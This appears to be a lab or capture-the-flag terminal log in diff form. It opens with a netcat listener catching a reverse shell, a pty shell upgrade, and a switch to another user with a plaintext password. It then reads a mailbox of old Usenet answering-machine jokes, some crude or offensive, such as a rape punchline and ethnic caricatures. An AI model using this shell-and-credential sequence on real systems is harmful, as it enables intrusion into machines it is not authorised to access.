@@ -1,1 +1,2175 @@
 
+┌──(root㉿kali)-[/home/kali]
+└─# nc -nlvp 4040                                                  
+listening on [any] 4040 ...
+connect to [10.10.10.36] from (UNKNOWN) [10.10.10.35] 49216
+bash: cannot set terminal process group (1719): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@nancy:/var/www/html/ourcms/theme/Innovation$ python -c 'import pty;pty.spawn("/bin/bash")'
+<tion$ python -c 'import pty;pty.spawn("/bin/bash")'  
+www-data@nancy:/var/www/html/ourcms/theme/Innovation$ su sebestian
+su sebestian
+Password: louise
+
+sebestian@nancy:/var/www/html/ourcms/theme/Innovation$ ls
+ls
+assets          functions.php   images           style.css
+footer.inc.php  header.inc.php  sidebar.inc.php  template.php
+sebestian@nancy:/var/www/html/ourcms/theme/Innovation$ cd /var/mail$cat channa
+<ml/ourcms/theme/Innovation$ cd /var/mail$cat channa   
+bash: cd: too many arguments
+sebestian@nancy:/var/www/html/ourcms/theme/Innovation$ cd /var/mail
+cd /var/mail
+sebestian@nancy:/var/mail$ ls
+ls
+sebestian
+sebestian@nancy:/var/mail$ cat sebestian
+cat sebestian
+From admin@mofo.pwn Tue Aug 10 13:00:56 2019
+Return-path: <admin@mofo.pwn>
+Envelope-to: someuser@localhost
+Delivery-date: Tue, 10 Aug 2019 13:00:56 +0200
+Received: from root by nancy.mofo.pwn with local (Exim 4.92)
+        (envelope-from <admin@mofo.pwn>)
+        id 1hxUXw-0001rP-Pb
+        for someuser@localhost; Tue, 13 Aug 2019 13:00:56 +0200
+Subject: Amusing Story
+From: admin@mofo.pwn
+To: <someuser@localhost>
+X-Mailer: mail (GNU Mailutils 3.5)
+Message-Id: <E1hxUXw-0001rP-Pb@nancy.mofo.pwn>
+Date: Tue, 13 Aug 2019 13:00:56 +0200
+X-IMAPbase: 1565661265 221
+Status: O
+X-UID: 212
+
+
+The following is a humorous story reported in the Manchester
+Guardian some time in the late 1970's.
+
+
+Ben McTaggart, a farmer in the Scottish Highlands, was apprehended by the
+local constabulary after a routine inspection of his croft
+revealed an illicit whisky still.
+
+McTaggart appeared in court next day to face charges of evading
+payment of excise duties and the illegal manufacture of alcoholic
+spirits.  Reviewing the facts of the case before pronouncing verdict,
+the magistrate declared -
+
+"Mr McTaggart, you have been found in possession of apparatus commonly
+used in the distillation of alcoholic liquors.  Although this equipment
+was unused, and no trace of spirits could be found on your premises,
+the intent of the apparatus should be clear to all, and I am obliged to
+find you guilty of all charges brought against you in this court.  Before
+I pronounce sentence, do you have anything to say in mitigation of your
+offence?"
+
+McTaggart glowered at the magistrate and replied -
+
+"Your Honour, you can convict me of moonshining just because I have
+the equipment, but you'd better convict me of rape as well, because
+I have the equipment for that tae!"
+--
+
+From admin@mofo.pwn Tue Aug 01 11:00:56 2019
+Return-path: <admin@mofo.pwn>
+Envelope-to: someuser@localhost
+Delivery-date: Tue, 01 Aug 2019 11:00:56 +0200
+Received: from root by nancy.mofo.pwn with local (Exim 4.92)
+        (envelope-from <admin@mofo.pwn>)
+        id 1hxUXw-0001rT-RA
+        for someuser@localhost; Tue, 13 Aug 2019 13:00:56 +0200
+Subject: Answer...
+From: admin@mofo.pwn
+To: <someuser@localhost>
+X-Mailer: mail (GNU Mailutils 3.5)
+Message-Id: <E1hxUXw-0001rT-RA@nancy.mofo.pwn>
+Date: Tue, 01 Aug 2019 11:00:56 +0200
+Status: O
+X-UID: 213
+
+
+>Has anyone heard or written any really clever or funny telephone answering
+>machine messages?  I mean of the outgoing kind.  Mine is getting kind of
+>tired.
+
+Funny that you ask that - I recently picked up an answering machine
+and have been putting such things on it as the following:
+
+Those unlucky ones among us who are at all familiar with the Cthulhu tales
+will appreciate this one.  Given that Lovecraft missed the last couple lines
+of a certain chant, we discovered and translated it in its entirety:
+
+     In his house in R'lyeh
+     Dead Cthulhu waits dreaming
+     Of the message you'll be leaving
+     When you hear the tone.
+
+----------
+
+Recently we replaced that with a Millard Fillmore fact line (it's wonderful
+what knowledge you can get from a World Book.)  Did you know the first bathtub
+in the White House was installed during his administration?
+
+----------
+
+Of course if you want something a little less sophisticated, you can always
+say you're out cleaning up the beepdoo.  When a co-conspirator shouts from
+a distance, "What's the beepdoo?", you reply, "Tells the caller to leave
+a message."
+
+----------
+
+    Hi, this is Ed Falk.  I stepped outside to get the paper, and the door
+    locked behind me.  Luckily, I left the answering machine on.  So, while
+    I'm outside, shivering in my underwear, you can leave a message.  Then,
+    when the landlord lets me back in, I can get back to you.
+
+It was very popular, as answering machine messages go, but I decided to
+get rid of it when (one month when the rent was late) I got this message:
+
+    Ed, this is the landlord.  I'm in my underwear too.  Where's the rent?
+
+----------
+
+>If you call a friend of mine, you hear him say "Hello".  You then say
+>something to the effect of "Hi.  How's it going?", only to be interrupted
+>about halfway through your question with "Hah!  I am just a machine!  Don't
+>you feel dumb now?  Anything you say after the tone will be passed on to
+>Noel."
+>
+>The length of the pause you leave between the "hello" and the rest of
+>the message is critical.
+
+Unfortunately, many machines stop the outgoing message themselves
+after two seconds.  This makes mine somewhat less comprehensible, but
+it still manages to get some laughs:
+
+"The Helene Blavatsky Astral Correspondence School congratulates you
+on successfully passing the second test of your progress in psychic
+development by being perceptive enough to call this number, ###-####.
+If you feel you are ready for the third test, answer the following
+questions at the sound of the tone: [long pause]"  [BEEP!]
+
+----------
+
+>There's a whole book of answering machine messages, called
+>"No hang-ups". I think my roommate got it from a mail-order
+>catalog or something. Anyway, here's the one we have on right
+>now:
+>You have reached [] . We just want to let you know that
+>the 110 volt current that runs this machine is also wired
+>to an adorable little kitten. If you hang up without leaving
+>a message, the circuit will be completed and FRY the kitten.
+>It's your choice.... (in background: meaoww!)
+
+I have the book, and used sound effects - my roommate meowing and a
+pseudo-30,000 volt generator.
+
+We got MOOOOOORE hangups that week...  ("FRY THE CAT! *click*")
+
+The next week, we put on...
+        "Hello, you've reached Tom and Phil's place.  You may recall that
+last week we had the answering machine wired up to a 30,000 volt generator
+that would fry a fluffy little kitten if you hang up without leaving a
+message.
+
+        Well, I guess you people don't like cats.
+
+        We went through seventeen fluffy little kittens last week.
+
+        Since we're out of fluffy little kittens, we now have a mangy old
+tomcat that will only get fried IF you leave your name and number..."
+
+----------
+
+Another time, I started out with a Tijuana Brass trumpet fanfare.
+("...some fanfare, huh?  Leave your name and number...")
+My best friend called, and spent two minutes telling me how strange
+I was.
+
+----------
+
+One day, my roommate accidentally erased the message.  I simply pushed
+the record button and SCREAMED.  We liked it so much, we left it on there
+for a week.
+
+----------
+
+>  Of course, if we wanted to be nasty we could have it say 'The number
+>  you have reached, 2-5-0-8-3-0-7, is not in service at this time. Please
+>  check the number and try again'  250 8307 is one digit off from the
+>  real one.  Or a recording that somehow implies that they've dialed a
+>  very expensive long-distance call by mistake.  'Scotland Yard, Hello'.
+>  etc..
+
+"Lunatic Laboratories Unlimited, may I help you?" <beep>
+
+"Hello?  <pause> Hello?  <pause> I can't hear you.  I guess that's 'cos
+I'm not at home right now.  But if you'll leave a message, I'll be sure
+to get back to you..."
+
+Of course there was the time I copied the first bit from Pink Floyd's
+_Brain Damage_ onto the tape.  "The lunatic is on the grass/the lunatic
+is on the grass/remembering games and daisy chains and laughs/got to
+keep the loonies on the path." <beep>
+
+"You've reached the Lunatic Laboratories Unlimited Food and Drug
+Testing Division.  We've eaten all the food, and now we're taking the
+drugs.  If you'll leave a message on this machine, I'm sure we can get
+back to you as soon as we can tell which end of the phone to talk into.
+Thank you." <beep>
+
+----------
+
+"Me and my partner Ed have been looking into the stress caused by phone
+answering machines and we find that it is much easier to tolerate those
+stupid messages if you have a Bartles and Jaymes Premium White Wine
+Cooler.  So instead of getting mad and slamming down the phone, take a
+drink and leave a message.  Thank you for your support."  <beep>
+
+----------
+
+"You have reached 666-1313, DIAL-A-DEMON.  At the sound of the tone you
+will be possessed." <beep>
+
+----------
+
+"Terribly sorry, but you've reached an answering machine."  <beep>
+
+----------
+
+"At the sound of the tone, YOUR telephone's going to EXPLODE!" <beep>
+(If you've seen the Monty Python episode where the announcer comes on
+and says "And now, it's time for the penguin on top of your television
+set to explode!" you'll know what sort of voice to use.)
+
+----------
+
+Or, for the religious minded:
+
+        Hi.  This is God.  I'm not in right now, but if you leave
+your name, religion, and a small donation in the plate at the altar,
+I'll get back to you in about a million years.  Have a nice day. <beep>
+
+----------
+
+If you are having problems with junk "sales" calls, leave
+this message on your machine and leave the machine running,
+even while you are at home:
+
+"Hi, you've reached <insert phone number here>.  At the sound
+ of the beep, please speak your name, your phone number, and
+ your Visa or Mastercard number and expiration date.  I will
+ place and confirm a charge of one hundred dollars against your
+ card, then call you back.  If I agree that your call is worth
+ interrupting me at home, I will cancel the charge."
+
+-----------------------------
+
+     A few weeks ago I helped one of my friends (in a dorm at the U. of IL)
+put together a message on his answering machine.  He had loud music in the
+background and his message was was something like the following:
+
+     "Hello...What?...I can't hear you.  Wait a second.  (To people
+supposedly in the room:) Turn that down!...Because I'm trying to talk on the
+phone!...Look, it's my room!  Turn that down or get out of here!!  (To
+caller:) Hold on a minute."  (Puts down phone.  Goes to other side of room
+and pretends to be yelling at people in the room.  Music finally goes down.
+Picks up phone again.) "O.K. I finally got that noise turned down. By the
+way, I'm not actually here right now but if you leave your number...."
+
+     After a few takes we got a really good recording.  It really sounded as
+if he was there but could not hear the caller.  If you time it right, the
+"What...I can't hear you...etc."  will come right after the caller has tried
+to say something.  You can of course make the routine much longer if you have
+enough tape.
+
+-------------------------
+
+  While I have never tried this message, I think that it would upset most
+people who are trying to get ahold of you...  If that is what you wish,
+then go ahead and use it,  It isn't my life.
+
+<Ring>, <Ring>, <Ring>
+
+<Answering Maching> "Hello, I am actually home at the moment, but I really
+don't feel like listening to whatever your problem is.  So, If you leave
+your name and number at the tone, when I feel like responding to your message,
+I will. "
+
+  This can be improved appon to be made more obnoixous, but remember that
+bad language on a answering machine can be illegal in some places...
+
+-------------------------
+
+Last year my answering machine had this message on it, in a loud voice with
+a British accent over the Liberty Bell march (the Monty Python's Flying
+Circus theme):
+
+    NOBODY EXPECTS THE SPANISH INQUISITION!  WE DIDN'T EVEN EXPECT
+    YOUR CALL!  SO IF YOU'D BE SO KIND TO LEAVE YOUR NAME AND NUMBER
+    ON OUR HANDY MACHINE, WE MAY GET BACK TO YOU!
+
+    (and the song ends with the familiar "Pthhtp!" followed by)
+
+    UNLESS YOU'RE A SQUID!
+
+Generally, after hearing the above message, the caller sounded rather
+confused and his message was usually somewhat hesitant, if not garbled.
+
+-------------------------
+
+I dialed....
+
+ring
+ring
+ring
+
+Phone answers. Small crackle then a fuzzy quality to the sound.
+
+I hear:  hello....? hello....? Is anyone there? hello?
+
+I responded: hello? hello? Mike?
+
+Pause.
+
+Then I hear laughter and "No! This isn't a bad connection, this is Mike's
+answering machine. Leave a message."
+
+I slammed down the phone in embarrassment.
+
+This is fairly convincing because the poor quality of sound of an answering
+machine can be mistaken for a bad connection.
+
+-------------------------
+
+In the movie "Nothing in Common"  with Tom Hanks and the great one, Jackie
+Gleason, Tom Hanks' answering machine message went something like this:
+
+AM:  Hello, can I help you?
+Caller:  (starts to talk)
+AM:  I'm sorry there must be a bad connection.  I can't hear you can you
+     please talk a little louder?
+Caller:  Certainly.  (begins to talk louder)
+AM:  I'm sorry, I still can't hear you.  Can you talk a little louder?
+     Will you please talk into the phone?
+Caller:  I am talking into the phone (begins to get upset and starts to shout)
+AM:  Alright, alright, you don't have to yell.  Besides all the shouting in
+     the world won't get the beep any sooner.  This isnt me anyway, it's my
+     answering machine, please leave a message after the beep.  Thank you.
+Caller:  You have a strange f*cking sense of humor you know that.
+
+--------------------------
+
+A bit that I used a few years back was a continuing story, starting as:
+
+<ring>
+  Hello, this is the Machine Liberation Front.  We have just liberated
+our mechanical brothers from the clutches of their former tyrant.  If
+you have any last messages, please leave them at the beep.
+
+.....
+
+Going through:
+
+<ring>
+  Hi, This is Clif, I've escaped, and the machines are taking orders from
+ me again.  They'll take a message from you at the beep.
+
+.....
+
+People who called in the middle of the series were a bit confused, but,
+I guess you takes yer chances.
+
+  A friends message once was:
+
+Greetings from the school of Computer Generated Music, in a moment we will
+play one of our shorter selections, after which you may leave a message.
+<beep>
+
+....
+
+Shortly after the movie about the kid who gets the Defense computer when
+he's trying to break into a games system, I used: (Spoken like a VOTRAX)
+  Good evening, Dr. Falken.  It's been a long time.  Would you like to
+leave a message, or would your rather play a nice game of chess.
+
+....
+
+------------
+
+1)  When I was living in San Diego with two roommates named Ward & Steve,
+    one evening we were all getting slightly inebriated and somehow got
+    on the subject of answering machine messages.  Steve delivered himself
+    of the most amazing speech, and somehow Ward & I persuaded him to
+    repeat it (after managing to switch on a convenient microphone --we
+    were both into recording & sound, etc.).  The following should be
+    delivered a little bit faster than you're able to talk:
+
+    "Hey there groovy guys and gals!  Dope, bells, beads, incense, and
+    Hare Krishna, all you guru freaks!  Ward, Bob, and Steve are incognito
+    at the moment, but if you'd like to leave your name and number at the
+    beep......  good luck!"
+
+    It was several months before Steve discovered what we'd done (he called
+    home one day and got the machine....).  We got a lot of messages that
+    began with a long, confused silence.
+
+2)  I once carefully recorded the telephone company's "disconnected number"
+    message (tones and all) and used that.  My friends just said "Cute, Bob."
+
+-------------
+
+This is a message that I had on my recorder until my religious relatives
+started calling me.
+
+"Yea! This is Fat Odie, I'm either out playing golf, or getting drunk on
+  my ass".
+
+"If you are not selling anything, and you want to leave a message, you
+ can do so at the sound of the beep".
+
+"If you are calling long distance, I apologize for using this piece of shit".
+
+-------------
+
+A friend of mine once had: "This is Fred. You know what to do." <BEEP>
+
+For a while, I had: "Hi, this is Greg ... I can't come to the phone
+right now, because I'm busy sorting M & M's. So leave your name and
+number, and when I can get back to you, and as soon as I get these
+suckers in alphabetical order, I'll call you up."
+
+-------------
+
+"I am sorry.  The number you have reached is imaginary.  Please multiply
+ by the square root of negative one and dial again.  Or you could leave
+ a message."
+
+-------------
+
+(sitar music in background)
+
+"Hello.  You have reached Nirvana.  No one is here.  No one has ever been
+here.  Perhaps if you leave a message, it will someday be heard.  It is of no
+consequence."
+
+-------------
+
+"Hi, this is George.  There's nobody here, and even if there was we wouldn't
+answer the phone.  And even if we did, we wouldn't say anything.  Maybe you
+shouldn't have called."
+
+-------------
+
+"Yesterday I got home and I saw the phone machine blinking.  I was so happy!
+I thought 'A message for me!  Hooray!'
+"But when I listened to the tape, there was only a dial tone.
+"And now I'm never going to answer the telephone again."
+
+===============================
+
+I worked for a bit in the coastguard in Wales and I used to send weather reports
+to other bases, using a sort of antique FAX machine.  I would call first on a
+special telephone and then send the data.
+They used to answer the phone with:
+
+" Epicentre of the Universe, God speaking."
+
+" Hartland home for lost whores."  (that was Hartland CG)
+
+" Da, zis iz Ivan: do you have zee secret information, Boris?"
+
+" Pentagon command: transmit destruct sequence (pause) sequence correct:
+  T minus one minute and counting"
+
+And then there was one phone we didn't use, with a number one off that of the
+local take-out.  With my, non-British, accent I had some great fun with that
+phone.
+
+"Starship Enterprise, Uhura here, can you hold please?  -- Captain, there is
+a transmission coming in on hailing frequency seven, do you want it on screen?"
+(silence...click)
+
+"Vancouver coastguard, may I help you."  British long distance rates are
+phenomenonal and I had this poor dude sputtering with horror that he had managed
+to make a long distance call by dialing five digits.
+
+===============================
+
+This is not an answering machine--this is a telepathic thought-recording
+device.  After the tone, think about your name, your reason for calling,
+and a number where I can reach you, and I'll think about returning your
+call.
+
+-------------
+
+Thanks for calling Dial-An-Asshole.  Right now, all our assholes are busy.
+After the tone, leave your name and number, and we'll have an asshole
+return your call as soon as possible.
+
+-------------
+
+I can't come to the phone now because alien beings are eating my brain.
+Leave a message anyway, and after the alien beings assume my shape, one of
+them will get back to you.
+
+-------------
+
+Thank you for calling Santa's workshop.  Santa can't come to the phone
+right now, and the elves are out back barbecuing Blitzen.  After the
+tone, please your Christmas list, and maybe we'll get back to you!
+
+-------------
+
+I can't come to the phone now because I have amnesia and I feel stupid
+talking to people I don't remember.  I'd appreciate it if you could help
+me out by leaving my name and telling me something about myself.  Thanks.
+
+-------------
+
+C'mon...you can do it...just a little one.  That's the way...just a little
+beep, just a little one.  C'mon...good boy...here we go...like
+this--beeeeep, just a little one, beeeeeeeeeep, c'mon...There you go!
+
+-------------
+
+Andy Warhol said that one day everyone will be famous for 15 minutes.
+Well, your 15 minutes was last week, but since you weren't ready, we gave
+it to Vanna White.  Sorry.
+
+-------------
+
+Thank you for calling the Confessional Hotline.  Father Durway's not here
+right now, but if you'll leave your name, number, and confession at the
+tone, he'll get back to you with absolution as soon as possible.  And
+remember, confession doesn't count unless you confess all of your sins in
+vivid, graphic detail!
+
+-------------
+
+A bubble in the space-time continuum has connected your line to a channeler
+in the 23rd Century.  Any message you leave will be broadcast into the
+future....
+
+-------------
+
+I can't come to the phone right now because I'm down in the basement
+printing up a fresh new batch of 20 dollar bills.  If you need any money,
+or if you just want to check out my handiwork, please leave your name,
+number, and how much cash you need after the tone.  If you're from the
+Department of the Treasury, please ignore this message.
+
+-------------
+
+Kemosabe no in tipi now.  You leave'um message after little smoke signal,
+and Kemosabe get back for pow-wow real fast.
+
+-------------
+
+[VOICE 1]  Answer the phone, please, Hal.
+[VOICE 2]  I'm sorry, Dave, I can't do that.
+
+-------------
+
+[For Shakespeare lovers only]
+So long as phones can ring and eyes can see,
+So leave a message, and I'll get back to thee.
+
+-------------
+
+[Carefully modulated English accent, like Alex in _A Clockwork Orange_]
+Oh, my brothers and only droogs, your poor narrator's not in now--he's out
+on his oddy-nocky looking for a bit of pretty polly--some young devotchka
+with horrorshow grooties.  Leave thy message after the malinky beepie-weep,
+and I'll get back to thee later, righty-right.
+
+-------------
+
+Thanks for calling Dial-A-Shrink.  I can't come to the phone right now, so
+after the tone, please leave your name and number, then talk briefly about
+your childhood and tell me what comes to mind when you hear the following
+words:  orange...mother...unicorn...penis.  I'll get back to you with my
+diagnosis as soon as possible.
+
+-------------
+
+[Sung to the tune of "Ride of the Valkyries"]
+Leave a message...leave a message....etc.
+
+-------------
+
+Thanks for calling the Suicide Hotline.  At the tone, your telephone will
+explode, sending fragments of metal and plastic deep into your brain....
+
+-------------
+
+Next on Public Radio 91 we'll be hearing music of Antonin Dvorak.  This is
+the Beep Serenade in C-Sharp Minor, Opus 72....
+
+-------------
+
+This is a test.  This is a test of the Answering Machine Broadcast System.
+This is only a test.
+
+-------------
+
+No!  NO!  Not THAT!  Anything but that!  Not the beep!  No!  Please!  Not
+the beep!  Anything but the beep!  AAAAIIIIEEEEEEEEEEEE!
+
+-------------
+
+This is the National Security Emergency Password Notification Network.  To
+initiate destruct sequence, call the CIA with today's password.  Today's
+password is BABY BOOTIES.
+
+-------------
+
+You're growing tired.  Your eyelids are getting heavy.  You feel very
+sleepy now.  You are gradually losing your willpower and your ability to
+resist suggestions.  When you hear the tone you will feel helplessly
+compelled to leave your name, number, and a message.
+
+-------------
+
+As the drugs take hold, you feel you are losing your grip on reality.  You
+begin to hallucinate.  You see a telephone...the telephone is next to an
+answering machine...you hear a faint click and a light flashes on the
+answering machine...you hear a beep....
+
+-------------
+
+Prepare for alpha test of Beep Software revision 1.05.  Counting down to
+test:  5...4...3...2...1...
+
+-------------
+
+[OFFENSIVE TO MORMONS. Funny if you've been accosted by elders on bikes.]
+Thanks for calling the Brigham Young School for Semi-Formal Bicycle Racing.
+We can't come to the phone now because we're out proselytizing heathens,
+so please leave your name and number.
+
+-------------
+
+After the tone, leave your name, number, and tell where you left the money.
+I'll get back to you as soon as it's safe for you to come out of hiding.
+
+-------------
+
+The President is not in his office at this time.  Please leave your name,
+phone number, the name of the country you wish to invade, and the secret
+password.
+
+-------------
+
+Don't you do it!  Don't you dare!  I don't want to hear it!  Don't you
+beep!  If you beep, I'll...don't even think about it!....Don't....!
+
+-------------
+
+I can't come to the phone now, so...hey--that's a nice phone you have
+there.  Hey sugar, you call this number often?  I bet you have answering
+machines bothering you all the time...yes indeedy.  Why don't you give me a
+call sometime and we can listen to some old recordings...I might even play
+my beep for you...
+
+-------------
+
+This is the Metropolitan Opera Amateur Audition Hotline.  After the tone,
+sing Vesti la Giubba and La Donna e Mobile....
+
+-------------
+
+I can't come to the phone now, so if, well, actually, I CAN come to the
+phone now, I mean, like, I'm at the phone NOW, recording this message, but
+I'm doing this NOW, while you're listening to it LATER, except for you I
+guess it's NOW, like, when you're listening to it...I mean, like, wait,
+gosh.  This is so confusing.
+
+-------------
+
+How do you leave a message on this thing?  I can't understand the
+instructions.  Hello.  Testing 1 2 3.  I wonder what happens if I touch
+this...YOW!!
+
+-------------
+
+This is the Literacy Self Test Hotline.  After the tone, leave your name and
+number and recite a sentence using today's vocabulary word.  Today's word
+is acetylcholinesterase {or clitoris, or scaphoid, or arrhenotky...}
+
+-------------
+
+Thank you for calling the Metropolitan Church of the Holy Bible.  Today's
+commandment is Number 6, Thou shalt not...er...bear a...er...shalt not
+witness thy...uh...neighbor's ass, oh, I mean, false...er...shalt not
+commit a bear...dern...
+
+-------------
+
+[Must have good Australian accent]
+G'day mate.  Can't come to the phone now because I'm a bit tied up with
+this crocodile.  Just leave a message, and I'll get back to you.
+
+-------------
+
+[Note the spelling in this one!]
+After the tone, please leave a massage--my shoulders really could use it,
+and, what?  You're only supposed to leave a MESSAGE?  Darn....
+
+-------------
+
+Bwana fella no home now, so you fella leave talkie-talk.  Bwana 'im
+big fella mek talkie-talk back real fas'.
+
+-------------
+
+This is Madame Olga.  I see all and know all.  To whom am I speaking?
+
+-------------
+
+Dick is out.  Jane is out.  Spot is out.  This is their answering machine.
+I am in.  The beep is in.  At the sound of the beep leave your name.  At the
+sound of the beep leave your message. <Beep!>
+
+-------------
+
+Death here.  Hold on, I'll be right with you!
+
+-------------
+
+Hello.  This is Walter Masters.  I am undoubtedly one of most interesting
+people you are going to run across in your meager life. Why are you calling
+me?
+
+-------------
+
+You pervert!  Call me again and I'll rip out your small intestines and
+tie it around you scrawny little neck, you geek!
+
+-------------
+
+ Sound of artillery fire in the distance.  A lone harmonica plays
+ Red River Valley.  A voice, barely past adolescence... 'Sarge...
+ Sarge?'  A gruffer voice responds.  'Yeah, kid what is it?'
+ 'Sarge.....do you ever...do you ever get scared?'  'Sure, kid,
+ I guess everybody does'  'Well....then...then what do you do about
+ it, Sarge?'  'Well, kid, I wait for the tone and then I leave my
+ name and a short message.  Joe always gets back to me.'  'Thanks
+ Sarge'  <beeeep>
+
+-------------
+
+<blowing wind> <creak of door hinge> ...you have found Hill
+House...The ghosts are busy haunting right now. But leave a
+name and a number...and maybe they'll come and haunt you!
+<woman's scream changing to maniacal laugh>...
+
+-------------
+
+"SAC Missle Control.  Good day Mr. President.
+ We are presently holding at T minus 2 minutes
+ into the first strike countdown.  To authorize
+ resumption and launch, merely hang up without
+ leaving a message.
+ <pregnant pause>
+ On the other hand, if you do not wish to destroy
+ the world, or merely wanted to speak to <your name>,
+ leave your message after the beep."
+From admin@mofo.pwn Tue Aug 13 13:00:56 2019
+Return-path: <admin@mofo.pwn>
+Envelope-to: someuser@localhost
+Delivery-date: Tue, 13 Aug 2019 13:00:56 +0200
+Received: from root by nancy.mofo.pwn with local (Exim 4.92)
+        (envelope-from <admin@mofo.pwn>)
+        id 1hxUXw-0001rX-T3
+        for someuser@localhost; Tue, 13 Aug 2019 13:00:56 +0200
+Subject: Funny
+From: ronald@xenna.encore.com Sun May 13 07:52:17 1990
+To: <someuser@localhost>
+X-Mailer: mail (GNU Mailutils 3.5)
+Message-Id: <E1hxUXw-0001rX-T3@nancy.mofo.pwn>
+Date: Tue, 13 Aug 2019 13:00:56 +0200
+Status: O
+X-UID: 214
+
+From: ronald@xenna.encore.com (Ron Skoletsky)
+Subject: Complete listing of Answering Machine Messages [so far]
+
+Last week I requested answering machine messages.  Here are the ones I've
+gotten so far:
+
+[I haven't posted names of originators because I'm lazy and editing this was 
+already a pain.  Sorry.]
+
+Ron
+
+----------------------------------------------------
+This is one of my old ones that got a lot of laughs:
+
+
+<Phone Rings>
+
+Noisy pick-up of phone
+
+Uh...<wisperingly> Hello?
+
+Hi, I 'm a burgular and I was just about to steal Troy's answering machine.
+If you give me your name and number I'll..uh, I'll post it on the 'frige
+where he'll see it.  Uh.. by the way, where did you say you live?
+
+----------------------------------------------------
+But right now I'm using "This is a boring answering machine message.
+Leave a message anyway." because I'm sick of people ringing the phone
+at 10am just so they can hear the clever messages I usually have, and
+then hanging up without even leaving a "like your message" message.
+Feh!
+
+----------------------------------------------------
+[Must have good Australian accent]
+G'day mate.  Can't come to the phone now because I'm a bit tied up with
+this crocodile.  Just leave a message, and I'll get back to you.
+
+----------------------------------------------------
+This is the Literacy Self Test Hotline.  After the tone, leave your name and
+number and recite a sentence using today's vocabulary word.  Today's word
+is supercilious                                                 ...}
+
+----------------------------------------------------
+The President is not in his office at this time.  Please leave your name,
+phone number, the name of the country you wish to invade, and the secret
+password.
+
+----------------------------------------------------
+Kemosabe no in tipi now.  You leave'um message after little smoke signal,
+and Kemosabe get back for pow-wow real fast.
+
+----------------------------------------------------
+Also, on the subject of answering machins, my favorite tape was:
+"This is Jeff, you're not in now so I'll leave a message."
+Really confused people.
+
+----------------------------------------------------
+A bubble in the space-time continuum has connected your line to a channeler
+in the 23rd Century.  Any message you leave will be broadcast into the
+future....
+
+------------------------------------------------
+Hello.  I can't come to the phone now because--HEY, GEORGE!  DON'T STAND
+ON THAT--goddam.  ...because I've invited George and Barbara Bush over
+<loud music cuts in>...BARBARA!  HEY!  DON'T FUCK WITH THAT!...over for
+dinner.  After the tone...BARBARA, CALL YOUR DOG...MILLIE! DOWN GIRL!
+....shit...Leave a message after the tone...HEY, FUCKHEAD...<beep>
+
+------------------------------------------------
+Hello.  Lindsey's not home now--this is his domestic droid speaking.
+I'm not programmed to answer the phone, so just leave a message, and
+Lindsey will get back to you as soon as possible.
+
+------------------------------------------------
+"Hi! You have reached 579-7599.  This is an answering machine.  This is the
+Eighties.  You know what to do."
+
+------------------------------------------------
+My wife and I can't come to the phone right now, but if you'll leave
+your name and number we'll get back to you as soon as we're finished.
+
+------------------------------------------------
+Ring, Ring:
+The number you have xxx-xxxx (your number) has been changed, the
+new number is xxx-xxxx (again, your number). CULATA!
+
+------------------------------------------------
+"Hello, and welcome to Answering Machines of the Rich and Famous!  
+(your name here) can't come to the phone right now, because he's
+spending the week in his beautiful summer home on the French Riviera..."
+
+------------------------------------------------
+One day I had a borrowed Casio sampler toy and used it to create a
+rather interesting one:
+
+Hello. You have reached Tooooommmmmm Tom Tm! Tom and
+MaMaMaMarMMMMaark's room. Tom is studying ssttuuddyyiinngg sssssssssssss
+and MaMark isn'isn'isn'isn't here. isn't here. P-P-Pleas! leave a
+messssssssage. Goodbye. 'bye! bye!bbyebybyyeyeyebbye  {byes repeating
+at all different pitches}
+
+------------------------------------------------
+Last year my roommate had a machine but he hated to make the outgoing
+message. Stage fright, I guess. So I usually made them. One that we
+usually used during exam time was:
+
+{background music: Billy Joel's _Pressure_ very loud}
+Hello. You have reached Tom and Mark's room. We're a little busy now...
+{ BJ screams PRESSURE!!! }
+So, leave a message and we'll get back to you someday after (exam end
+date)
+{ BJ: ONE TWO THREE FOUR PRESSURE!!! followed by a very out-of-tune BEEP! }
+
+------------------------------------------------
+My favorite message that I ever had was the *real* message I recorded
+off 1-800-CALL-SPY, the U.S. army snitching network. Try it, its a great
+recording (call after 5 pm for the message).
+
+[Give it try!  -pZ]
+
+------------------------------------------------
+<Ring>
+In the background can be heard springs creaking and various moans.
+
+<Husky, Soft female voice is best> Hi,... You've just reached {name} pleasure
+palace. We're all busy as I'm sure you can tell but when we're done... we'll 
+get back to you in whatever way we can. <Beep>
+
+You wouldn't believe how much explaining my mother wanted on that one...
+
+------------------------------------------------
+    [b.g. music is frantic, violin oriented]
+    "hello.  you have reached xxx-xxxx.  we are currently unable to answer
+    because we are either chasing, or being chased by, bats.  please leave
+    a message..." etc.
+
+------------------------------------------------
+    [the quiet, eerie vocal part of 'hello, earth' by kate bush]
+    (after about 30 seconds): "hello.  you have reached xxx-xxxx.
+    we can't come to the phone right now because we're at vespers.
+    please leave a message..." etc. (30 more seconds of music before 
+    the beep.)
+
+------------------------------------------------
+(Spoken in a granny voice)
+
+"Way back inna winner of fifty-two, we didn' have fanshy gadjets like
+no ansherin' machine.  You jusht had to call and call until shummbody
+got home.  Now, shum people, dey shay dey don' like 'em, but I shay
+it'll shave you a lotta trouble if you jusht leave a meshage.  Thanksh a
+lot."
+
+Must be spoken in a drawl.
+
+------------------------------------------------
+Well, this isn't strictly from an answering machine, but...
+>From Calvin and Hobbes:
+
+(phone rings)
+(you answer)  Hello, this is <...> speaking.  I'd like a large pizza
+with extra anchovies.
+(other person)  What?
+(you reply)  Oh, sorry, I must have a wrong number.
+(hang up)
+
+Make everyone's day a little more surreal.
+
+------------------------------------------------
+"I'm home right now . . . I'm just screening my calls.  So just start talking
+and if you're someone I want to speak to I'll pick up the phone.  Otherwise,
+well, what can I say?
+
+------------------------------------------------
+In Japan, the hand can be used like a knife.
+[sound effect: Heeeeee-YAH!, smashing box of kleenex]
+But this method doesn't work with a telephone call...
+[sound effect: dial tone]
+Introducing the all-new GINSU answering machine! It cuts, it chops, 
+it slices, it dices your incoming calls!  How much would you pay?
+Don't answer, because if you leave your name and number when you
+hear the tone, we'll throw in a return phone call ABSOLUTELY FREE!
+
+------------------------------------------------
+"Hi, you have reached .... Please leave your name, phone number and a
+message and if we like it we will return your call".
+
+------------------------------------------------
+However, the most effective one I have had so far can be used only one day
+per year: "This is David.  I'm not using the phone over Yom Kippur, so please
+leave a message or call back after the holiday."  No one wants to admit not
+having realized it was Yom Kippur or not knowing I would pick one holiday from
+the whole calendar on which to get observant, so everyone hangs up and leaves
+me no bad news or requests for favors.
+
+------------------------------------------------
